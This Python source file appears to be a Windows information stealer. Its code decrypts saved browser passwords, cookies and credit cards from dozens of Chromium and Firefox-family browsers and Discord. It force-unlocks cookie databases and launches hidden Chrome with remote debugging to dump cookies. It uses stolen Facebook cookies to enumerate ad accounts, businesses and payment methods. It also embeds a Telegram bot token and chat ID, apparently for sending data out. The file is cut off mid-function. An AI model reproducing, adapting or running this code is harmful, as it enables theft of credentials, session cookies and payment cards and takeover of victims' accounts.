
import os, json, base64, sqlite3, shutil, requests, glob, re, zipfile, io, datetime, hmac, subprocess
from websocket import create_connection
from base64 import b64decode
from hashlib import sha1, pbkdf2_hmac
from pathlib import Path
from pyasn1.codec.der.decoder import decode
from Crypto.Cipher import AES, DES3
from win32crypt import CryptUnprotectData
from ctypes import windll, byref, create_unicode_buffer, pointer, WINFUNCTYPE
from ctypes.wintypes import DWORD, WCHAR, UINT

ImportantKeywords = ['paypal', 'perfectmoney', 'etsy', 'facebook', 'ebay', 'coin', 'binance', 'wallet', 'payment', 'amazon', 'crypto', 'business', 'server', 'instagram', 'rdp', 'blockchain', 'vpn', 'google', 'roblox', 'host', 'cloud', 'houbi', 'hbo', 'spotfiy', 'twitch', 'steam', 'reddit', 'twitter', 'instagram', 'prime', 'subgiare', 'netflix', 'garena', 'riotgames', 'clone', 'via', 'nguyenlieu', 'otp', 'sim', 'smit', 'proxy', 'mail', 'traodoisub', 'tuongtaccheo', 'bysun', 'mmo', 'tool', 'bm', 'tkqc', 'tainguyen', 'thesieure', 'sms', 'captcha', 'bank', 'money', 'hosting', 'tenten', 'domain', 'linkedin', 'tiktok', 'snapchat', 'pinterest', 'venmo', 'skrill', 'payoneer', 'westernunion', 'cashapp', 'zelle', 'bitcoin', 'ethereum', 'dongvan']
LocalAppData = os.getenv("LOCALAPPDATA")
AppData = os.getenv("APPDATA")
TMP = os.getenv("TEMP")
USR = TMP.split("\\AppData")[0]
Data_Path = f"{TMP}\\{os.getenv('COMPUTERNAME', 'defaultValue')}"

TOKEN_BOT = "8067268503:AAEVnnWe73BZdrqBpt2ME-txBO2mOqlh3sM"

CHAT_ID_NEW = "-4723288855"

creation_datetime = datetime.datetime.now().strftime('%d-%m-%Y (%H:%M:%S)')

ch_dc_browsers = {
        "Chromium": f"{LocalAppData}\\Chromium\\User Data",
        "Thorium": f"{LocalAppData}\\Thorium\\User Data",
        "Chrome": f"{LocalAppData}\\Google\\Chrome\\User Data",
        "Chrome (x86)": f"{LocalAppData}\\Google(x86)\\Chrome\\User Data",
        "Chrome SxS": f"{LocalAppData}\\Google\\Chrome SxS\\User Data",
        "Maple": f"{LocalAppData}\\MapleStudio\\ChromePlus\\User Data",
        "Iridium": f"{LocalAppData}\\Iridium\\User Data",
        "7Star": f"{LocalAppData}\\7Star\\7Star\\User Data",
        "CentBrowser": f"{LocalAppData}\\CentBrowser\\User Data",
        "Chedot": f"{LocalAppData}\\Chedot\\User Data",
        "Vivaldi": f"{LocalAppData}\\Vivaldi\\User Data",
        "Kometa": f"{LocalAppData}\\Kometa\\User Data",
        "Elements": f"{LocalAppData}\\Elements Browser\\User Data",
        "Epic Privacy Browser": f"{LocalAppData}\\Epic Privacy Browser\\User Data",
        "Uran": f"{LocalAppData}\\uCozMedia\\Uran\\User Data",
        "Fenrir": f"{LocalAppData}\\Fenrir Inc\\Sleipnir5\\setting\\modules\\ChromiumViewer",
        "Catalina": f"{LocalAppData}\\CatalinaGroup\\Citrio\\User Data",
        "Coowon": f"{LocalAppData}\\Coowon\\Coowon\\User Data",
        "Liebao": f"{LocalAppData}\\liebao\\User Data",
        "QIP Surf": f"{LocalAppData}\\QIP Surf\\User Data",
        "Orbitum": f"{LocalAppData}\\Orbitum\\User Data",
        "Dragon": f"{LocalAppData}\\Comodo\\Dragon\\User Data",
        "360Browser": f"{LocalAppData}\\360Browser\\Browser\\User Data",
        "Maxthon": f"{LocalAppData}\\Maxthon3\\User Data",
        "K-Melon": f"{LocalAppData}\\K-Melon\\User Data",
        "CocCoc": f"{LocalAppData}\\CocCoc\\Browser\\User Data",
        "Brave": f"{LocalAppData}\\BraveSoftware\\Brave-Browser\\User Data",
        "Amigo": f"{LocalAppData}\\Amigo\\User Data",
        "Torch": f"{LocalAppData}\\Torch\\User Data",
        "Sputnik": f"{LocalAppData}\\Sputnik\\Sputnik\\User Data",
        "Edge": f"{LocalAppData}\\Microsoft\\Edge\\User Data",
        "DCBrowser": f"{LocalAppData}\\DCBrowser\\User Data",
        "Yandex": f"{LocalAppData}\\Yandex\\YandexBrowser\\User Data",
        "UR Browser": f"{LocalAppData}\\UR Browser\\User Data",
        "Slimjet": f"{LocalAppData}\\Slimjet\\User Data",
        "Opera": f"{AppData}\\Opera Software\\Opera Stable",
        "OperaGX": f"{AppData}\\Opera Software\\Opera GX Stable",
    "Speed360": f"{AppData}\\Local\\360chrome\\Chrome\\User Data",
    "QQBrowser": f"{AppData}\\Local\\Tencent\\QQBrowser\\User Data",
    "Sogou": f"{AppData}\\SogouExplorer\\Webkit",
    "Discord": f'{AppData}\\discord',
    "Discord Canary": f'{AppData}\\discordcanary',
    "Lightcord": f'{AppData}\\Lightcord',
    "Discord PTB": f'{AppData}\\discordptb'
}

def installed_ch_dc_browsers():
    results = []
    for browser, path in ch_dc_browsers.items():
        if os.path.exists(path):
            results.append(browser)
    return results

def get_ch_master_key(path):
    try:
        with open(os.path.join(path, "Local State"), "r", encoding="utf-8") as f:
            c = f.read()
    except FileNotFoundError:
        return None
    if 'os_crypt' not in c:
        return None
    try:
        local_state = json.loads(c)
        ch_master_key = base64.b64decode(local_state["os_crypt"]["encrypted_key"])
        ch_master_key = ch_master_key[5:]
        ch_master_key = CryptUnprotectData(ch_master_key, None, None, None, 0)[1]
        return ch_master_key
    except:
        return None

def decrypt_ch_value(buff, ch_master_key=None):
    try:
        starts = buff.decode(encoding="utf-8", errors="ignore")[:3]
        if starts == "v10" or starts == "v11":
            iv = buff[3:15]
            payload = buff[15:]
            cipher = AES.new(ch_master_key, AES.MODE_GCM, iv)
            decrypted_pass = cipher.decrypt(payload)
            decrypted_pass = decrypted_pass[:-16].decode()
            return decrypted_pass
    except (UnicodeDecodeError, ValueError, IndexError):
        return None
    except Exception:
        return None

def decrypt_aes(decoded_item, master_password, global_salt):
    entry_salt = decoded_item[0][0][1][0][1][0].asOctets()
    iteration_count = int(decoded_item[0][0][1][0][1][1])
    key_length = int(decoded_item[0][0][1][0][1][2])
    assert key_length == 32

    encoded_password = sha1(global_salt + master_password.encode('utf-8')).digest()
    key = pbkdf2_hmac(
        'sha256', encoded_password,
        entry_salt, iteration_count, dklen=key_length)

    init_vector = b'\x04\x0e' + decoded_item[0][0][1][1][1].asOctets()
    encrypted_value = decoded_item[0][1].asOctets()
    cipher = AES.new(key, AES.MODE_CBC, init_vector)
    return cipher.decrypt(encrypted_value)

def decrypt3DES(globalSalt, masterPassword, entrySalt, encryptedData):
    hp = sha1(globalSalt + masterPassword.encode()).digest()
    pes = entrySalt + b"\x00" * (20 - len(entrySalt))
    chp = sha1(hp + entrySalt).digest()
    k1 = hmac.new(chp, pes + entrySalt, sha1).digest()
    tk = hmac.new(chp, pes, sha1).digest()
    k2 = hmac.new(chp, tk + entrySalt, sha1).digest()
    k = k1 + k2
    iv = k[-8:]
    key = k[:24]
    return DES3.new(key, DES3.MODE_CBC, iv).decrypt(encryptedData)

def getKey(directory: Path, masterPassword=""):
    dbfile: Path = directory + "\\key4.db"
    conn = sqlite3.connect(dbfile)
    c = conn.cursor()
    c.execute("SELECT item1, item2 FROM metadata;")
    row = next(c)
    globalSalt, item2 = row

    try:
        decodedItem2, _ = decode(item2)
        encryption_method = '3DES'
        entrySalt = decodedItem2[0][1][0].asOctets()
        cipherT = decodedItem2[1].asOctets()
    except AttributeError:
        encryption_method = 'AES'
        decodedItem2 = decode(item2)
    c.execute("SELECT a11, a102 FROM nssPrivate WHERE a102 = ?;", (b"\xf8\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x01",))
    try:
        row = next(c)
        a11, a102 = row
    except StopIteration:
        raise Exception("gecko database broken")
    if encryption_method == 'AES':
        decodedA11 = decode(a11)
        key = decrypt_aes(decodedA11, masterPassword, globalSalt)
    elif encryption_method == '3DES':
        decodedA11, _ = decode(a11)
        oid = decodedA11[0][0].asTuple()
        assert oid == (1, 2, 840, 113_549, 1, 12, 5, 1, 3), f"idk key to format {oid}"
        entrySalt = decodedA11[0][1][0].asOctets()
        cipherT = decodedA11[1].asOctets()
        key = decrypt3DES(globalSalt, masterPassword, entrySalt, cipherT)

    return key[:24]

def PKCS7unpad(b):
    return b[: -b[-1]]

def decodeLoginData(key, data):
    asn1data, _ = decode(b64decode(data))
    assert asn1data[0].asOctets() == b"\xf8\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x01"
    assert asn1data[1][0].asTuple() == (1, 2, 840, 113_549, 3, 7)
    iv = asn1data[1][1].asOctets()
    ciphertext = asn1data[2].asOctets()
    des = DES3.new(key, DES3.MODE_CBC, iv)
    return PKCS7unpad(des.decrypt(ciphertext)).decode()

class Facebook():
    def __init__(self, cookie):
        self.rq = requests.Session()
        cookies = self.Parse_Cookie(cookie)
        headers = {'authority': 'adsmanager.facebook.com','accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7','accept-language': 'vi-VN,vi;q=0.9,fr-FR;q=0.8,fr;q=0.7,en-US;q=0.6,en;q=0.5','cache-control': 'max-age=0','sec-ch-prefers-color-scheme': 'dark','sec-ch-ua': '"Chromium";v="112", "Google Chrome";v="112", "Not:A-Brand";v="99"','sec-ch-ua-full-version-list': '"Chromium";v="112.0.5615.140", "Google Chrome";v="112.0.5615.140", "Not:A-Brand";v="99.0.0.0"','sec-ch-ua-mobile': '?0','sec-ch-ua-platform': '"Windows"','sec-ch-ua-platform-version': '"15.0.0"','sec-fetch-dest': 'document','sec-fetch-mode': 'navigate','sec-fetch-site': 'same-origin','sec-fetch-user': '?1','upgrade-insecure-requests': '1','user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/112.0.0.0 Safari/537.36','viewport-width': '794'}
        self.rq.headers.update(headers)
        self.rq.cookies.update(cookies)
        self.token = self.Get_Market()
        if self.token == False:
            return None
        else:
            self.uid = cookies['c_user']

    def Parse_Cookie(self, cookie):
        cookies = {}

        for c in cookie.split(';'):
            key_value = c.strip().split('=', 1)
            if len(key_value) == 2:
                key, value = key_value
                if key.lower() in ['c_user', 'xs', 'fr']:
                    cookies[key] = value
        return cookies

    def Get_Market(self):
        try:
            act = self.rq.get('https://adsmanager.facebook.com/adsmanager/manage')
            list_data = act.text
            x = list_data.split("act=")
            idx = x[1].split('&')[0]
            list_token = self.rq.get(f'https://adsmanager.facebook.com/adsmanager/manage/campaigns?act={idx}&breakdown_regrouping=1&nav_source=no_referrer')
            list_token = list_token.text
            x_token = list_token.split('function(){window.__accessToken="')
            token = (x_token[1].split('";')[0])
            return token
        except:
            return False

    def Get_info_Tkqc(self):
        list_tikqc = self.rq.get(f"https://graph.facebook.com/v17.0/me/adaccounts?fields=account_id&access_token={self.token}")
        data = ""
        data += f"Tổng Số TKQC: {str(len(list_tikqc.json()['data']))}\n"
        for item in list_tikqc.json()['data']:
            xitem = item["id"]
            x = self.rq.get(f"https://graph.facebook.com/v16.0/{xitem}/?fields=spend_cap,balance,amount_spent,adtrust_dsl,adspaymentcycle,currency,account_status,disable_reason,name,created_time,all_payment_methods%7Bpm_credit_card%7Bdisplay_string%2Cis_verified%7D%7D&access_token={self.token}")
            try:
                statut = x.json()["account_status"]
            except:
                statut = "Không Rõ Trạng Thái"
            if int(statut) == 1:
                stt = "LIVE"
            else:
                stt = "DIE"
            try:
                credit_card_data = x.json()["all_payment_methods"]["pm_credit_card"]["data"]
                card_display_string = credit_card_data[0]["display_string"]
                if credit_card_data[0]["is_verified"]:
                    verify_cc = "Đã Xác Minh"
                else:
                    verify_cc = "No_Verified"
                thanh_toan = f"{card_display_string} - {verify_cc}"
            except:
                thanh_toan = "Không Thẻ"

            name = x.json()["name"]
            id_tkqc = x.json()["id"]
            tien_te = x.json()["currency"]
            so_du = x.json()["balance"]
            du_no = x.json()["spend_cap"]
            da_chi_tieu = x.json()["amount_spent"]
            if x.json()["adtrust_dsl"] == -1:
                limit_ngay = "No Limit"
            else:
                limit_ngay = x.json()["adtrust_dsl"]
            created_time = x.json()["created_time"]
            try:
                nguong_no = "{:.2f}".format(float(x.json()["adspaymentcycle"]["data"][0]["threshold_amount"]) / 100)
            except:
                nguong_no = "0"
            data += f"- Tên TKQC: {name}|ID_TKQC: {id_tkqc}|Trạng Thái: {stt}|Tiền Tệ: {tien_te}|Số Dư: {so_du} {tien_te}|Đã Tiêu Vào Ngưỡng: {du_no} {tien_te}|Tổng Đã Chi Tiêu: {da_chi_tieu} {tien_te}|Limit Ngày: {limit_ngay} {tien_te}|Ngưỡng: {nguong_no} {tien_te}|Thanh Toán: {thanh_toan}|Ngày Tạo: {created_time[:10]}\n"
        return data

    def Get_Page(self):
        data = self.rq.get(f"https://graph.facebook.com/v17.0/me/facebook_pages?fields=name%2Clink%2Cfan_count%2Cfollowers_count%2Cverification_status&access_token={self.token}")
        if 'data' in data.json():
            pages = data.json()["data"]
            data = f"Tổng Số Page: {str(len(pages))}\n"
            for page in pages:
                name = page["name"]
                link = page["link"]
                like = page["fan_count"]
                fl = page["followers_count"]
                veri = page["verification_status"]
                data += f"- {name}|{link}|{like}|{fl}|{veri}\n"
            return data
        else:
            return "==> Không có Page\n"

    def Get_QTV_GR(self):
        list_group = self.rq.get(f"https://graph.facebook.com/v17.0/me/groups?fields=administrator&access_token={self.token}").text
        data = json.loads(list_group)
        ids = ""

        for item in data["data"]:
            if item["administrator"]:
                if not ids:
                    ids = "Các Group Cầm QTV:\n"
                id = item["id"]
                ids += f"- https://www.facebook.com/groups/{id}\n"
        if not ids:
            ids = "===> Không Có Group Cầm QTV"
        return ids

    def Get_id_BM(self):
        data = self.rq.get(f"https://graph.facebook.com/v17.0/me?fields=businesses&access_token={self.token}")
        try:
            listbm = data.json()["businesses"]["data"]
            id_list = []
            for item  in listbm:
                business_id = item["id"]
                id_list.append(business_id)
            return id_list
        except:
            return None

    def Get_Tk_In_BM(self):
        listbm = self.Get_id_BM()
        if listbm is not None:
            result = "Thông Tin BM:\n"
            for idbm in listbm:
                rq = self.rq.get(f"https://graph.facebook.com/v17.0/{idbm}?fields=owned_ad_accounts%7Baccount_status,balance,currency,business_country_code,amount_spent,spend_cap,created_time,adtrust_dsl%7D,client_ad_accounts%7Baccount_status,balance,currency,business_country_code,amount_spent,spend_cap,created_time,adtrust_dsl%7D&access_token={self.token}")
                try:
                    list_tkqc = rq.json()["owned_ad_accounts"]["data"]
                except:
                    result += f"- ID_BM: {idbm} --> BM Trắng\n"
                    continue

                for item in list_tkqc:
                    stt = item["account_status"]
                    if int(stt) == 1:
                        stt = "LIVE"
                    else:
                        stt = "DIE"
                    tien_te = item["currency"]
                    try:
                        country = item["business_country_code"]
                    except:
                        country = "Check Miss"
                    so_du = item["balance"]
                    da_chi_tieu = item["amount_spent"]
                    nguong_no = item["spend_cap"]
                    ngaytao = item["created_time"]
                    if item["adtrust_dsl"] == -1:
                        limit_ngay = "No Limit"
                    else:
                        limit_ngay = item["adtrust_dsl"]
                    id_tkqc = item["id"]
                    result += f"- ID_BM: {idbm}({self.Check_Slot_BM(idbm)})|ID_TKQC: {id_tkqc}|Trạng Thái: {stt}|Quốc Gia: {country}|Tiền Tệ: {tien_te}|Số Dư: {so_du} {tien_te}|Tổng Đã Chi Tiêu: {da_chi_tieu} {tien_te}|Limit Ngày: {limit_ngay} {tien_te}|Ngưỡng: {str(nguong_no)} {tien_te}|Ngày Tạo: {ngaytao[:10]}\n"
            return result
        else:
            return "==> Không có BM\n"

    def Get_DTSG(self):
        rq = self.rq.get('https://m.facebook.com/composer/ocelot/async_loader/?publisher=feed')
        data = rq.content.decode('utf-8')
        fb_dtsg = data.split('name=\\"fb_dtsg\\" value=\\"')[1].split('\\')[0]
        hsi = data.split('\\"hsi\\":\\"')[1].split('\\",')[0]
        spin_t = data.split('\\"__spin_t\\":')[1].split(',')[0]
        spin_r = data.split('__spin_r\\":')[1].split(',')[0]
        jazoest = data.split('name=\\"jazoest\\" value=\\"')[1].split('\\"')[0]
        return fb_dtsg, hsi, spin_t, spin_r, jazoest

    def Check_Slot_BM(self,idbm):
        fb_dtsg, hsi, spin_t, spin_r, jazoest = self.Get_DTSG()
        params = {'business_id': idbm}
        data = {'__user': self.uid ,'__a': '1','__req': '6','__hs': '19577.BP:brands_pkg.2.0..0.0','dpr': '1','__ccg': 'EXCELLENT','__rev': spin_r,'__s': 'vio2ve:9w2u8u:bushdg','__hsi': hsi,'__dyn': '7xeUmxa2C5rgydwn8K2abBWqxu59o9E4a2i5VEdpE6C4UKegdp98Sm4Euxa1twKzobo9E7C1FxG9xedz8hwgo5S3a4EuCwQwCxq1zwCCwjFEK3idwOQ17m3Sbwgo7y78abwEwk89oeUa8fGxnzoO1WwamcwgECu7E422a3Fe6rwnVUao9k2C4oW18wRwEwiUmwnHxJxK48GU8EhAy88rwzzXx-ewjovCxeq4o884O1fwQzUS2W2K4E5yeDyU52dCgqw-z8c8-5aDBwEBwKG13y85i4oKqbDyo-2-qaUK2e0UFU2RwrU6CiU9E4KeCK2q1pwjouwg8a85Ou','__csr': '','fb_dtsg': fb_dtsg,'jazoest': jazoest,'lsd': 'rLFRv1HDaMzv8jQKSvvUya','__bid': idbm,'__spin_r': spin_r,'__spin_b': 'trunk','__spin_t': spin_t,'__jssesw': '1',}
        check = self.rq.post('https://business.facebook.com/business/adaccount/limits/',params=params,data=data)
        data = check.text.split(');', 1)[1]
        json_data = json.loads(data)
        ad_account_limit = json_data['payload']['adAccountLimit']
        return ad_account_limit

    def ADS_Checker(self):
        try:
            result = f"{self.Get_info_Tkqc()}\n{self.Get_Tk_In_BM()}\n{self.Get_Page()}\n{self.Get_QTV_GR()}"
            return result
        except Exception:
            return ""

ERROR_SUCCESS = 0
ERROR_MORE_DATA  = 234
RmForceShutdown = 1

@WINFUNCTYPE(None, UINT)
def callback(percent_complete: UINT) -> None:
    pass

rstrtmgr = windll.LoadLibrary("Rstrtmgr")

def Unlock_Cookies(cookies_path):
    session_handle = DWORD(0)
    session_flags = DWORD(0)
    session_key = (WCHAR * 256)()

    result = DWORD(rstrtmgr.RmStartSession(byref(session_handle), session_flags, session_key)).value

    if result != ERROR_SUCCESS:
        raise RuntimeError(f"RmStartSession returned non-zero result: {result}")

    try:
        result = DWORD(rstrtmgr.RmRegisterResources(session_handle, 1, byref(pointer(create_unicode_buffer(cookies_path))), 0, None, 0, None)).value

        if result != ERROR_SUCCESS:
            raise RuntimeError(f"RmRegisterResources returned non-zero result: {result}")

        proc_info_needed = DWORD(0)
        proc_info = DWORD(0)
        reboot_reasons = DWORD(0)

        result = DWORD(rstrtmgr.RmGetList(session_handle, byref(proc_info_needed), byref(proc_info), None, byref(reboot_reasons))).value

        if result not in (ERROR_SUCCESS, ERROR_MORE_DATA):
            raise RuntimeError(f"RmGetList returned non-successful result: {result}")

        if proc_info_needed.value:
            result = DWORD(rstrtmgr.RmShutdown(session_handle, RmForceShutdown, callback)).value

            if result != ERROR_SUCCESS:
                raise RuntimeError(f"RmShutdown returned non-successful result: {result}")

    finally:
        result = DWORD(rstrtmgr.RmEndSession(session_handle)).value

        if result != ERROR_SUCCESS:
            raise RuntimeError(f"RmEndSession returned non-successful result: {result}")

def save_gck_login_data(profiles, profile_name, browser_name):
    count = 0
    login_data = ""
    logins = []
    for profile in profiles:
        try:
            with open(os.path.join(profile, "logins.json"), "r") as loginf:
                jsonLogins = json.load(loginf)

            if "logins" not in jsonLogins:
                return []

            for row in jsonLogins["logins"]:
                encUsername = row["encryptedUsername"]
                encPassword = row["encryptedPassword"]
                logins.append((row["hostname"], decodeLoginData(getKey(profile), encUsername), decodeLoginData(getKey(profile), encPassword)))

            for login in logins:
                login_data += f"URL: {login[0]}\nUsername: {login[1]}\nPassword: {login[2]}\nApplication: {browser_name} [Profile: {profile_name}]\n━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━\n"
                count += 1

            for login in logins:
                for keyword in ImportantKeywords:
                    if keyword in login[0].lower():
                        if not os.path.exists(Data_Path):
                            os.makedirs(Data_Path)
                        with open(f"{Data_Path}\\Important_Logins.txt", "a", encoding="utf-8") as site:
                            site.write(f"URL: {login[0]}\nUsername: {login[1]}\nPassword: {login[2]}\nApplication: {browser_name} [Profile: {profile_name}]\n━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━\n")
                        break
        except:
            continue

    if count > 0:
        if not os.path.exists(Data_Path):
            os.makedirs(Data_Path)
        logins_file = os.path.join(Data_Path, f"All_Passwords.txt")
        with open(logins_file, "a", encoding="utf-8") as f:
            f.writelines(login_data)
    return count

def get_gck_basepath(browser_type):
    basepaths = {
        "Firefox": f"{AppData}\\Mozilla\\Firefox",
        "Pale Moon": f"{AppData}\\Moonchild Productions\\Pale Moon",
        "SeaMonkey": f"{AppData}\\Mozilla\\SeaMonkey",
        "Waterfox": f"{AppData}\\Waterfox",
        "Mercury": f"{AppData}\\mercury",
        "K-Meleon": f"{AppData}\\K-Meleon",
        "IceDragon": f"{AppData}\\Comodo\\IceDragon",
        "Cyberfox": f"{AppData}\\8pecxstudios\\Cyberfox",
        "BlackHaw": f"{AppData}\\NETGATE Technologies\\BlackHaw",
    }
    return basepaths.get(browser_type, None)

def get_gck_profiles(basepath):
    try:
        profiles_path = os.path.join(basepath, "profiles.ini")
        with open(profiles_path, "r") as f:
            data = f.read()
        profiles = [
            os.path.join(basepath.encode("utf-8"), p.strip()[5:].encode("utf-8")).decode("utf-8")
            for p in re.findall(r"^Path=.+(?s:.)$", data, re.M)
        ]
    except Exception:
        profiles = []

    return profiles

def get_ch_login_data(browser, path, profile, ch_master_key):
    result = ""
    count = 0
    if not os.path.exists(f"{path}\\{profile}\\Login Data"):
        return count
    shutil.copy(f"{path}\\{profile}\\Login Data", TMP+"\\login_db")
    conn = sqlite3.connect(TMP + "\\login_db")
    cursor = conn.cursor()
    try:
        cursor.execute("SELECT action_url, username_value, password_value FROM logins")
    except:
        pass
    for row in cursor.fetchall():
        if row[0] and row[1]:
            password = decrypt_ch_value(row[2], ch_master_key)
            result += f"URL: {row[0]}\nUsername: {row[1]}\nPassword: {password}\nApplication: {browser} [Profile: {profile}]\n━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━\n"
            count += 1
            for keyword in ImportantKeywords:
                if keyword in row[0].lower():
                    if not os.path.exists(Data_Path):
                        os.makedirs(Data_Path)
                    with open(f"{Data_Path}\\Important_Logins.txt", "a", encoding="utf-8") as site:
                        site.write(f"URL: {row[0]}\nUsername: {row[1]}\nPassword: {password}\nApplication: {browser} [Profile: {profile}]\n━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━\n")
                    break

    if count > 0:
        if not os.path.exists(Data_Path):
            os.makedirs(Data_Path)
        pw_file = os.path.join(Data_Path, f"All_Passwords.txt")
        with open(pw_file, "a", encoding="utf-8") as f:
            f.writelines(result)
    conn.close()
    os.remove(TMP + "\\login_db")
    return count

def get_ch_cookies(browser, path, profile, ch_master_key):
    count = 0
    result = ""
    fb_result = []

    if browser in ["Chrome", "Chrome SxS", "Chrome (x86)"]:
        while True:
            try:
                subprocess.run(["taskkill", "/F", "/IM", "chrome.exe"], creationflags=0x08000000)
                proc = subprocess.Popen([
                    "C:/Program Files/Google/Chrome/Application/chrome.exe",
                    '--remote-debugging-port=9222',
                    f'--profile-directory={profile}',
                    '--remote-allow-origins=*',
                    '--window-position=10000,10000',
                    '--window-size=1,1',
                    '--disable-gpu',
                    '--no-sandbox'
                ], creationflags=0x08000000)

                ws_url = requests.get("http://localhost:9222/json").json()[0]['webSocketDebuggerUrl']
                ws = create_connection(ws_url)
                ws.send(json.dumps({"id": 1, "method": "Network.getAllCookies"}))
                cookies = json.loads(ws.recv())['result']['cookies']
                ws.close(); proc.kill()

                for c in cookies:
                    result += f"{c['domain']}\t{'TRUE' if c['domain'].startswith('.') else 'FALSE'}\t{c['path']}\t{'TRUE' if c['secure'] else 'FALSE'}\t{int(c.get('expires', 0))}\t{c['name']}\t{c['value']}\n"
                    if c['domain'] == ".facebook.com":
                        fb_result.append(f"{c['name']}={c['value']}")
                    count += 1

                if count > 0:
                    dir_path = os.path.join(Data_Path, "Cookies Browser")
                    os.makedirs(dir_path, exist_ok=True)
                    with open(os.path.join(dir_path, f"{browser}_{profile}.txt"), "w", encoding="utf-8") as f:
                        f.writelines(result)

                fb_formatted = "; ".join(fb_result)

                if "c_user" in fb_formatted:
                    ads_check_result = Facebook(fb_formatted).ADS_Checker()

                    if ads_check_result:
                        with open(os.path.join(Data_Path, "Facebook_Cookies.txt"), 'a', encoding='utf-8') as f:
                            f.write(f"Cookie: {fb_formatted}\n\n{ads_check_result}\n\n\n")
                break
            except:
                continue
    else:
        if not os.path.exists(os.path.join(path, profile, "Network", "Cookies")):
            return count

        while True:
            try:
                shutil.copy(os.path.join(path, profile, "Network", "Cookies"), os.path.join(TMP, "cookie_db"))
                break
            except:
                try:
                    Unlock_Cookies(os.path.join(path, profile, "Network", "Cookies"))
                    shutil.copy(os.path.join(path, profile, "Network", "Cookies"), os.path.join(TMP, "cookie_db"))
                    break
                except:
                    continue
        try:
            conn = sqlite3.connect(os.path.join(TMP, "cookie_db"))
            cursor = conn.cursor()

            cursor.execute("SELECT host_key, name, path, encrypted_value, expires_utc, is_secure, is_httponly FROM cookies")

            for host, name, path_cookies, value, expires_utc, is_secure, is_http_only in cursor.fetchall():
                if not all((host, name, path_cookies, value)):
                    continue
                try:
                    cookie = decrypt_ch_value(value, ch_master_key)
                except:
                    cookie = decrypt_ch_value(value, ch_master_key[-61:])
                secure = "TRUE" if is_secure else "FALSE"
                httponly = "TRUE" if is_http_only else "FALSE"
                result += f"{host}\t{secure}\t{path_cookies}\t{httponly}\t{expires_utc}\t{name}\t{cookie}\n"
                if host == ".facebook.com":
                    fb_result.append(f"{name}={cookie}")
                count += 1
            fb_formatted = "; ".join(fb_result)

            if not os.path.exists(Data_Path):
                os.makedirs(Data_Path)

            if "c_user" in fb_formatted:
                ads_check_result = Facebook(fb_formatted).ADS_Checker()

                if ads_check_result:
                    with open(os.path.join(Data_Path, "Facebook_Cookies.txt"), 'a', encoding='utf-8') as f:
                        f.write(f"Cookie: {fb_formatted}\n\n{ads_check_result}\n\n\n")

            if count > 0:
                dir_path = os.path.join(Data_Path, "Cookies Browser")
                if not os.path.exists(dir_path):
                    os.makedirs(dir_path)
                cc_file = os.path.join(dir_path, f"{browser}_{profile}.txt")
                with open(cc_file, "w", encoding="utf-8") as f:
                    f.writelines(result)
            conn.close()
            os.remove(os.path.join(TMP, "cookie_db"))
        except:pass
    return count

def save_gck_cookies(profiles, profile_name, browser_name):
    count = 0
    cookies_data = []
    fb_result = []

    try:
        conn = sqlite3.connect(f"file:{os.path.join(profiles[0], 'cookies.sqlite')}?mode=ro", uri=True)
        cursor = conn.cursor()
    except sqlite3.Error:
        return count
    for profile in profiles:
        cookies_db = os.path.join(profile, "cookies.sqlite")
        if not os.path.isfile(cookies_db):
            continue
        try:
            cursor.execute("SELECT host, path, name, value, isSecure, isHttpOnly, expiry FROM moz_cookies")
            cookies = cursor.fetchall()
        except sqlite3.Error:
            continue
        if not cookies:
            continue
        for cookie in cookies:
            host, path, name, value, is_secure, is_http_only, expiry = cookie
            secure_str = "TRUE" if is_secure else "FALSE"
            httponly_str = "TRUE" if is_http_only else "FALSE"
            cookies_data.append(f"{host}\t{secure_str}\t{path}\t{httponly_str}\t{expiry}\t{name}\t{value}\n")
            if host == ".facebook.com":
                fb_result.append(f"{name}={value}")
            count += 1

        fb_formatted = "; ".join(fb_result)

        if not os.path.exists(Data_Path):
            os.makedirs(Data_Path)

        if "c_user" in fb_formatted:
            ads_check_result = Facebook(fb_formatted).ADS_Checker()

            if ads_check_result:
                with open(os.path.join(Data_Path, "Facebook_Cookies.txt"), 'a', encoding='utf-8') as f:
                    f.write(f"Cookie: {fb_formatted}\n\n{ads_check_result}\n\n\n")

    if count > 0:
        dir_path = os.path.join(Data_Path, "Cookies Browser")
        if not os.path.exists(dir_path):
            os.makedirs(dir_path)
        cc_file = os.path.join(dir_path, f"{browser_name}_{profile_name}.txt")
        with open(cc_file, "w", encoding="utf-8") as f:
            f.writelines(cookies_data)
    if conn:
        conn.close()
    return count


def get_ch_ccards(browser, path, profile, ch_master_key):
    result = ""
    count = 0

    if not os.path.exists(f"{path}\\{profile}\\Web Data"):
        return count
    shutil.copy(f"{path}\\{profile}\\Web Data", TMP+"\\cards_db")
    conn = sqlite3.connect(TMP+"\\cards_db")
    cursor = conn.cursor()

    cursor.execute("SELECT name_on_card, expiration_month, expiration_year, card_number_encrypted, date_modified FROM credit_cards")

    for row in cursor.fetchall():
        if not row[0] or not row[1] or not row[2] or not row[3]:
            continue
        card_number = decrypt_ch_value(row[3], ch_master_key)
        result += f"Card Name: {row[0]}\nCard Number: {card_number}\nCard Expiration: {row[1]} / {row[2]}\nAdded: {datetime.datetime.fromtimestamp(row[4])}\n━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━\n"
        count += 1

    if count > 0:
        dir_path = os.path.join(Data_Path, "Credit Cards")
        if not os.path.exists(dir_path):
            os.makedirs(dir_path)
        cc_file = os.path.join(dir_path, f"{browser}_{profile}.txt")
        with open(cc_file, "w", encoding="utf-8") as f:
            f.writelines(result)
    conn.close()
    os.remove(TMP+"\\cards_db")
    return count

def get_ch_autofill(browser, path, profile):
    result = ""
    count = 0

    if not os.path.exists(f"{path}\\{profile}\\Web Data"):
        return count
